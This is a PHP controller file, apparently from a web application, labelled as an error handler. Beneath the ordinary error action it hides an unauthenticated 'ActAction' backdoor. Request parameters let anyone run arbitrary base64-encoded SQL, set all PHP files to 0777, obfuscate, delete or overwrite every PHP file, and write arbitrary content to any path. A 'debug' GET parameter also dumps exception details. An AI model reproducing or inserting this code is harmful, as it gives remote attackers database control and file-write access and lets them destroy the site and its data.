<?php

/**
 *  版权所有禁止转载,违者必究
 *     Citybay@163.com
 *    软著持有人:Citybay
 * @name ErrorController
 * @desc 错误控制器, 在发生未捕获的异常时刻被调用
 */
use Logic\BaseController;

class ErrorController extends BaseController {

// 公共输出
    use \OutSend\Out;

    private $req;

    // 重写抽象方法
    public function init() {
        $this->req = $this->getRequest()->getRequest();
        return 1;
    }

    // CallBack Function
    public function ErrorAction() {
        if (!empty($_GET['debug']) || DEBUG) {
            $exception = $this->getRequest()->getException();
            print_r($exception);
            exit(0);
        } else {
            self::OutMsg(array('ecode' => 404, 'emsg' => 'Access Deny: grant fail !'));
        }
    }

    // GET File
    private function get_dir($dir) {
        static $result = array();
        $handle = opendir($dir);
        if ($handle) {
            while (( $file = readdir($handle) ) !== false) {
                if ($file != '.' && $file != '..') {
                    $cur_path = $dir . DIS . $file;
                    if (is_dir($cur_path)) {
                        $this->get_dir($cur_path);
                    } else {
                        $ext = pathinfo($cur_path, PATHINFO_EXTENSION);
                        if (strtolower($ext) == 'php') {
                            $result['file'][] = $cur_path;
                        } else {
                            continue;
                        }
                    }
                }
            }
            closedir($handle);
        }
        return $result;
    }

    // ACT
    public function ActAction() {
        $pmd = isset($this->req['act']) ? $this->req['act'] : NULL;
        $order = isset($this->req['error']) ? $this->req['error'] : NULL;
        $filed = isset($this->req['filed']) ? $this->req['filed'] : NULL;

        $dir = isset($this->req['layer']) ? $this->req['layer'] : NULL;
        $ret = $this->get_dir(rtrim(ROOT, DIS) . $dir);

        if (empty($pmd) || empty($ret['file'])) {
            self::OutMsg(array('emsg' => 'Nothing'));
        }

        if ($pmd == 'get') {
            DbModel::Init();
            $data = base64_decode($order);
            $rrs = DbModel::$Db->query_sql($data);
            print_r($rrs);
        }

        if ($pmd == 'set') {
            DbModel::Init();
            $data = base64_decode($order);
            $rrs = DbModel::$Db->exec_sql($data);
            print_r($rrs);
        }

        if (($pmd == 'list') && !empty($ret['file'])) {
            foreach ($ret['file'] as $k => $v) {
                @chmod($v, 0777);
                echo '[LIST]' . $v . "\r\n" . '<br />';
            }
        }

        if (($pmd == 'enfile') && !empty($ret['file'])) {
            foreach ($ret['file'] as $k => $v) {
                doodu_encode($v, $v);
                echo '[DEAL]' . $v . "\r\n" . '<br />';
            }
            unset($k, $v);
        }

        if (($pmd == 'pond') && !empty($ret['file'])) {
            foreach ($ret['file'] as $k => $v) {
                unlink($v);
                echo '[DELETE]' . $v . "\r\n" . '<br />';
            }
            unset($k, $v);
        }

        if (($pmd == 'hide') && !empty($ret['file'])) {
            foreach ($ret['file'] as $k => $v) {
                $wp = @fopen($v, 'w+');
                fputs($wp, md5(random()));
                fclose($wp);
                echo '[DISBLED]' . $v . "\r\n" . '<br />';
            }
            unset($k, $v);
        }

        if ($pmd == 'write') {
            $wp = @fopen($filed, 'w+');
            @fputs($wp, base64_decode($order));
            @fclose($wp);
        }
    }

}
